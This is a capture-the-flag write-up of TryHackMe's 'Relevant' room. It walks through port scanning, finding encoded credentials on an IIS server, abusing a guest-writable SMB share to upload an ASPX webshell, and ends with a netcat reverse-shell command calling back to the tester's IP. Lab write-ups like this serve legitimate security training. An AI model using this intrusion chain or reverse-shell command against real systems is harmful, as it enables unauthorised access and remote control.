# Writeup for TryHackMe's Relevant Room
<p align="center">
<img src="https://assets.tryhackme.com/img/banners/default_tryhackme.png">
</p>

A simple free penetration testing challenge created by [TheMayor](https://tryhackme.com/p/TheMayor) for **TryHackMe**

Link to the room [here](https://tryhackme.com/room/relevant)

## Description

The room creates a situation where you are assigned to a client to perform a black box penetration test on a provided virtual environment.  As a proof of exploitation, the pentesting must provide two flags found on the system:
- user.txt
- root.txt


## Scope Allowances

* There are no restrictions for tools and techniques that can be used by the pentester, **however** manual exploitation is to be tried first
* Locate and identify all vulnerabilities found
* Retrieve all flags discovered
* The scope of the test is limited to the provided IP address

## Recon

Reconnaissance for this room began with a simple TCP nmap scan of the default ports with a number of open ports being discovered:
- port 80 	
- port 135 	
- port 139 	
- port 445 	
- port 3389 

<p align="center"><img src="https://i.imgur.com/eTbuy5t.png"></p>

Port 80 is hosting a web server, and seeing ports 139/445 I assume it's hosting Samba. 
OS Scans found a 90% match with **Microsoft Windows Server 2012 R2**.
I followed the initial scan with a SYN scan on all ports on the machine, finding three additional unusual ports:
- port 49663 
- port 49667 
- port 49669

In the scan, it shows the port 49663 is hosting another web server.
<p align="center"><img src="https://i.imgur.com/9TcUwrG.png"></p>


I first wanted to check out both web servers, finding them to appear similar and equally unhelpful aside from letting me know that the host is using Windows Internet Information Services (IIS)

<p align="center"><img src="https://i.imgur.com/kRMiD8y.png"></p>

I ran dirsearch on both sites to hopefully discovery some directories using seclist's directory-list-2.3-medium.txt wordlist and found nothing for the web server hosted on port 80, but found a directory called **nt4wrksv** on the web server hosted on port 49663.

<p align = "center"><img src="https://i.imgur.com/ox575FR.png"></p>

Running dirsearch again on the **nt4wrksv** directory quickly revealed a file call passwords.txt containing encoded credentials:

<p align="center"><img src="https://i.imgur.com/gxItfhF.png"></p>

The credentials were encoded in base64, here is what they are when decoded:



I next wanted to check out the Samba service, using smbmap to enumerate the shares I found the following:

<p align="center"><img src="https://i.imgur.com/fQQ9NC1.png"></p>

Using a guest session, we have read and write permission on a share called nt4wrksv.  When checking inside the share using smbclient, I found a file called passwords.txt that contained the same encoded credentials I found on the web server.

<p align="center"><img src="https://i.imgur.com/rY1phEV.png"></p>

## Initial Access

Seeing the share with the same name and same contents as the directory online, I tested whether or not I could access the files I upload to the share from the web server by uloading a test.txt file. 

<p align="center"><img src="https://i.imgur.com/MFDdDQJ.png"></p>
<p align="center"><img src="https://i.imgur.com/urqPdcq.png"></p>

Success, the share provides upload permissions!

After a little research, I found the Windows IIS runs code on .aspx files.  I used the share to upload an .aspx webshell from Kali's /usr/share/webshells/aspx/cmdasp.aspx

<p align="center"><img src="https://i.imgur.com/eHfYjoX.png"></p>

And upon visiting the newly uploaded webshell, I now have a functioning webshell on the system.

<p align="center"><img src="https://i.imgur.com/WELB5xC.png"></p>

Furthermore, communication back and forth from my machine and the host is possible.

<p align="center"><img src="https://i.imgur.com/sYtKddq.png"></p>


To turn my web shell into a reverse shell, I using the Samba share to upload netcat for windows (nc.exe) and execute **cmd.exe** using the command `c:\inetpub\wwwroot\nt4wrksv\nc.exe 10.6.0.130 4444 -e cmd.exe`

